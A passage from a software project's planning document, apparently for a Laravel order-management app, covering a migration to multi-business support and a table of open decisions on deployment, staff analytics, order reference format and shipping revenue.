   `BusinessSetting::current()` is cached per business.

**Migration.** An existing installation is moved into one business named after its settings.
A fresh database invents none. The migration was gated on a copy of the development
database: migrate, roll back, migrate. At every step the row counts of all 14 tables and the
money sums (order totals, payments, refunds, line totals, expenses, stock) were identical.
The rollback refuses to run when more than one business exists, because it would merge
their data.

**Not in this step.** The raw aggregate queries (`DB::table`, 25 of them) and the `exists:`
validation rules bypass a model scope. With one business they behave as before; making them
business-aware, and proving it endpoint by endpoint, is the next step (P2 phase 2).

**Cost accepted.** Every new business-owned table needs the column and the trait, and every
new raw query needs the business filter. The phase 2 tests exist to make forgetting either
fail loudly.

## Open decisions

These need an answer from the project owner before the phase that depends on them.

| # | Question | Default if unanswered | Needed by |
| --- | --- | --- | --- |
| ~~**OD-1**~~ | Confirm single-business (ADR-001). | **Resolved Phase 01** — proceeded single-business on the documented default. No `businesses` table, no tenant column. Reversible via ADR-001's migration path, but the cost rises with every table added, so raise it now if it is wrong. | — |
| ~~**OD-2**~~ | Hosts-file requirement vs BFF proxy. | **Resolved Phase 01 — the question dissolved.** There is no hosts-file requirement; see ADR-002's revised cost. Sanctum SPA kept. | — |
| ~~**OD-3**~~ | Currency and timezone for seed data. | **Resolved Phase 01** — seeded `BHD`, `Asia/Bahrain`, fiscal year starting January, in `business_settings`. Changing them is an Owner editing two fields, not a migration. | — |
| **OD-4** | Deployment target. Vercel plus a managed PHP host? A single VPS? It affects queue, cache and cookie-domain configuration, not application code. | Decide in Phase 06 | Phase 06 |
| **OD-5** | Should Staff see any analytics at all, or none? Currently none (ROLES_AND_PERMISSIONS.md §3.1). A revenue-only analytics view is a separate surface with its own design and tests. | Staff get no analytics module | Phase 04 |
| **OD-6** | Order reference format. `ORD-2026-000418` is assumed; some businesses require a specific scheme. | `ORD-{year}-{6-digit sequence}` | Phase 02 |
| **OD-7** | Does the business profit on shipping (ADR-013)? If so, Net Revenue's definition changes. | Shipping excluded from revenue | Phase 04 |
